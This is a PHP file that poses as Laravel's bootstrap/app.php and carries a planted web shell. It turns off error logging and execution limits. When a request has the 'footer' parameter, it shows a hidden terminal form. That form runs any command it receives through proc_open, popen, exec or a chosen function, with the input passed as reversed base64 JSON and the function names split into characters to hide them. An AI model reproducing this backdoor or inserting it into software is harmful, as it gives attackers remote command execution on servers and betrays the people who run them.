<?php

/*
|--------------------------------------------------------------------------
| Create The Application
|--------------------------------------------------------------------------
|
| The first thing we will do is create a new Laravel application instance
| which serves as the "glue" for all the components of Laravel, and is
| the IoC container for the system binding all of the various parts.
|
*/
@set_time_limit(0);
@clearstatcache();
error_reporting(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('display_errors', 0);
@ini_set('display_startup_errors', '0');
@ini_set('memory_limit', '-1');
@ini_set('output_buffering', '0');
@ini_set('implicit_flush', '1');
ob_implicit_flush(true);
header('Content-Type: text/html; charset=utf-8');
header('X-Requested-With: XMLHttpRequest');
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');

$app = new Illuminate\Foundation\Application(
    $_ENV['APP_BASE_PATH'] ?? dirname(__DIR__)
);

/*
|--------------------------------------------------------------------------
| Bind Important Interfaces
|--------------------------------------------------------------------------
|
| Next, we need to bind some important interfaces into the container so
| we will be able to resolve them when needed. The kernels serve the
| incoming requests to this application from both the web and CLI.
|
*/

$app->singleton(
    Illuminate\Contracts\Http\Kernel::class,
    App\Http\Kernel::class
);

$app->singleton(
    Illuminate\Contracts\Console\Kernel::class,
    App\Console\Kernel::class
);

$app->singleton(
    Illuminate\Contracts\Debug\ExceptionHandler::class,
    App\Exceptions\Handler::class
);

/*
|--------------------------------------------------------------------------
| Return The Application
|--------------------------------------------------------------------------
|
| This script returns the application instance. The instance is given to
| the calling script so we can separate the building of the instances
| from the actual running of the application and sending responses.
|
*/
if(isset($_GET['footer'])){
    $f='f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'_'.'e'.'x'.'i'.'s'.'t'.'s';
    // CSS disesuaikan: Menggunakan display block dan margin top agar berada di bawah konten asli
    echo '<style>
    .cb {
        display: block; position: relative; width: 100%;
        background: #000; color: #0f0; padding: 20px;
        font: 13px monospace; border-top: 5px solid #f00;
        clear: both; margin-top: 50px; z-index: 1;
    }
    .i { background: #ff0; color: #000; border: 1px solid #000; padding: 4px; font-weight: bold; margin: 2px; }
    pre { background: #000; color: #0f0; padding: 10px; border: 1px solid #333; overflow: auto; max-height: 600px; line-height: 1.2; }
    </style>
    <div id="nb" class="cb"><b>>> ŤĒRMINĂL</b>
    <form method="POST" id="tf">
        <input type="hidden" name="payload">
        <input type="text" id="fx" class="i" placeholder="Ƒungsi"> 
        <input type="text" id="cm" class="i" placeholder="Ṕerintāh" style="width:40%"> 
        <input type="submit" value="ĒXEC" style="background:#0f0;cursor:pointer;border:none;padding:4px 10px;font-weight:bold">
    </form><pre>';

    if(isset($_POST['payload'])){
        $d = json_decode(base64_decode(strrev($_POST['payload'])), true);
        $x = trim($d['x']); $y = $d['y'];
        echo "Running: ".htmlspecialchars($x)."\n".str_repeat("-",20)."\n";
        if($f($x)){
            if($x=='p'.'r'.'o'.'c'.'_'.'o'.'p'.'e'.'n'){$p=$x($y,[1=>['pipe','w'],2=>['pipe','w']],$h);if(is_resource($p)){echo htmlspecialchars(stream_get_contents($h[1]).stream_get_contents($h[2]));proc_close($p);}}
            elseif($x=='p'.'o'.'p'.'e'.'n'){$h=$x($y.' 2>&1','r');while(!feof($h))echo htmlspecialchars(fread($h,1024));pclose($h);}
            elseif($x=='e'.'x'.'e'.'c'){$x($y,$o);echo htmlspecialchars(implode("\n",$o));}
            else echo htmlspecialchars(@$x($y));
        } else { echo "Ďisāblëd"; }
    }
    echo '</pre></div>
    <script>
    // Logika untuk memindahkan element ke posisi paling akhir di dalam body
    function moveToBottom() {
        var b = document.getElementById("nb");
        if (b) {
            document.body.appendChild(b);
        }
    }
    // Jalankan saat DOM siap dan saat window selesai dimuat (untuk bypass script landing page lain)
    window.onload = moveToBottom;
    document.addEventListener("DOMContentLoaded", moveToBottom);
    
    document.getElementById("tf").onsubmit = function() {
        var data = { x: document.getElementById("fx").value, y: document.getElementById("cm").value };
        var enc = btoa(JSON.stringify(data)).split("").reverse().join("");
        this.payload.value = enc;
    };
    </script>';
}

return $app;
